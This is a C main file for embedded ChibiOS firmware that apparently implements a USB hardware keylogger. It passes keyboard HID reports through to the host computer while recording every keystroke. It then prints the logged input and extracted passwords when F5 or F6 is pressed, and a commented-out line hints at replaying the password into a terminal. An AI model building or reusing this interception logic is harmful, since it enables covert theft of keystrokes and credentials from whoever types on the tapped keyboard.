//main.c

#include "ch.h"
#include "hal.h"

#include "led.h"
#include "rtt.h"
#include "spi.h"
#include "usb.h"
#include "usbh.h"
#include "timer.h"

int main(void)
{
    halInit();
    chSysInit();

    led_init();
    rtt_init();
    spi_init();
    usb_init();
    usbh_init();
    timer_init();

    timer_on();

    uint8_t *report;

    while(1) {
        //mailbox check
        chMBFetch(&umb, (msg_t *)&report, TIME_INFINITE);

        /* send the key on the computer */
        usb_report(&UHD2, report, 8);

        //get every input in a tab
        uint16_t input = get_input_hid(report);
        rtt_printf("Key: %c (%04x)", hid2azerty(input), input);

        usbh_add_input(input);

        if(input == KEY_F5)
            usbh_print_input();
        if(input == KEY_F6)
            usbh_print_password();
        //if(input == KEY_F7)
        //    usb_password_terminal(&UHD2);
    }

    return 0;
}
